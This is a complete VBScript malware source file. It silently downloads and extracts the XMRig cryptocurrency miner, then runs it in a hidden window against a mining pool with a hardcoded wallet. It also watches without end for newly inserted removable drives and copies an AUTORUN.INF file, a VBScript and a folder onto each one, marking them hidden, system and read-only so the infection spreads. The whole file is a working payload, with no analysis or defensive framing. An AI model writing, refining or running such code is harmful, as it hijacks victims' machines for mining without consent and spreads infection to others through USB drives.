Option Explicit
On Error Resume Next

Dim downloadUrl, zipFileName, extractedFolderName, exeName, minerArgs, autorunFile, vbsFile, openFolder
Dim http, stream, fso, wshShell, shellApp, scriptPath, zipFilePath, extractPath, exePath, command
Dim srcAutorunPath, srcVbsPath, srcOpenFolderPath
Dim wmiService, initialDrives, colDisks, objDisk, driveLetter
Dim destAutorun, destVbs, destFolder
Dim currentDrives, key
Dim zipFolder

downloadUrl = "https://github.com/tvhbes/the-tvhbes/releases/download/tvhbes/xmrig-6.24.0-windows-x64.zip"
zipFileName = "xmrig-6.24.0-windows-x64.zip"
extractedFolderName = "xmrig-6.24.0"
exeName = "xmrig.exe"
minerArgs = "-o pool.hashvault.pro:443 -u 471q5TCWH23JtsjiSVNXs8TNRCp4aadn7b5Lmxi9xFrLgimAFyqajGqXAfDFjFvZkiRkZmEnC3wYbeMs1FsJ8u8oVmf17Fc -p ratul001 -a rx/0 -k --donate-level 1"
autorunFile = "AUTORUN.INF"
vbsFile = "sami.vbs"
openFolder = "OpenFile"

Set fso = CreateObject("Scripting.FileSystemObject")
Set wshShell = CreateObject("WScript.Shell")
scriptPath = fso.GetParentFolderName(WScript.ScriptFullName)

zipFilePath = fso.BuildPath(scriptPath, zipFileName)
extractPath = fso.BuildPath(scriptPath, "")

' Correctly define paths based on user's directory structure
exePath = fso.BuildPath(fso.BuildPath(scriptPath, extractedFolderName), exeName)
srcAutorunPath = fso.BuildPath(scriptPath, autorunFile)
srcVbsPath = fso.BuildPath(scriptPath, vbsFile)
srcOpenFolderPath = fso.BuildPath(scriptPath, openFolder)

If Not fso.FileExists(exePath) Then
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number = 0 Then
        http.SetTimeouts 10000, 30000, 60000, 60000
        http.Open "GET", downloadUrl, False
        http.Send
        If http.Status = 200 Then
            Set stream = CreateObject("ADODB.Stream")
            stream.Open
            stream.Type = 1
            stream.Write http.ResponseBody
            stream.SaveToFile zipFilePath, 2
            stream.Close
            Set stream = Nothing
            
            Set shellApp = CreateObject("Shell.Application")
            If fso.FileExists(zipFilePath) Then
                Set zipFolder = shellApp.NameSpace(zipFilePath)
                Set destFolder = shellApp.NameSpace(extractPath)
                destFolder.CopyHere zipFolder.Items, 20
            End If
            Set shellApp = Nothing
        End If
        Set http = Nothing
    End If
End If

If fso.FileExists(exePath) Then
    command = """" & exePath & """ " & minerArgs
    wshShell.Run command, 0, False
End If

Set initialDrives = CreateObject("Scripting.Dictionary")
Set wmiService = GetObject("winmgmts:\\.\root\cimv2")
Set colDisks = wmiService.ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DriveType=2")

For Each objDisk in colDisks
    initialDrives.Add objDisk.DeviceID, True
Next

Do
    WScript.Sleep 5000
    Set colDisks = wmiService.ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DriveType=2")
    
    For Each objDisk in colDisks
        driveLetter = objDisk.DeviceID
        If Not initialDrives.Exists(driveLetter) Then
            initialDrives.Add driveLetter, True
            WScript.Sleep 10000 ' Wait 10 seconds after detection
            
            destAutorun = fso.BuildPath(driveLetter & "\", autorunFile)
            destVbs = fso.BuildPath(driveLetter & "\", vbsFile)
            destFolder = fso.BuildPath(driveLetter & "\", openFolder)
            
            ' Check for and delete existing files/folder before copying
            If fso.FolderExists(destFolder) Then
                wshShell.Run "cmd.exe /c attrib -h -s -r """ & destFolder & """ /s /d", 0, True
                fso.DeleteFolder destFolder, True
            End If
            If fso.FileExists(destAutorun) Then
                wshShell.Run "cmd.exe /c attrib -h -s -r """ & destAutorun & """", 0, True
                fso.DeleteFile destAutorun, True
            End If
            If fso.FileExists(destVbs) Then
                wshShell.Run "cmd.exe /c attrib -h -s -r """ & destVbs & """", 0, True
                fso.DeleteFile destVbs, True
            End If
            
            ' Copy new files and folder
            fso.CopyFile srcAutorunPath, destAutorun, True
            fso.CopyFile srcVbsPath, destVbs, True
            fso.CopyFolder srcOpenFolderPath, destFolder, True
            
            ' Set attributes for the new files and folder
            wshShell.Run "cmd.exe /c attrib +h +s +r """ & destAutorun & """", 0, True
            wshShell.Run "cmd.exe /c attrib +h +s +r """ & destVbs & """", 0, True
            wshShell.Run "cmd.exe /c attrib +h +s +r """ & destFolder & """ /s /d", 0, True
        End If
    Next
    
    Set currentDrives = CreateObject("Scripting.Dictionary")
    For Each objDisk in colDisks
        currentDrives.Add objDisk.DeviceID, True
    Next

    For Each key in initialDrives.Keys
        If Not currentDrives.Exists(key) Then
            initialDrives.Remove(key)
        End If
    Next
Loop
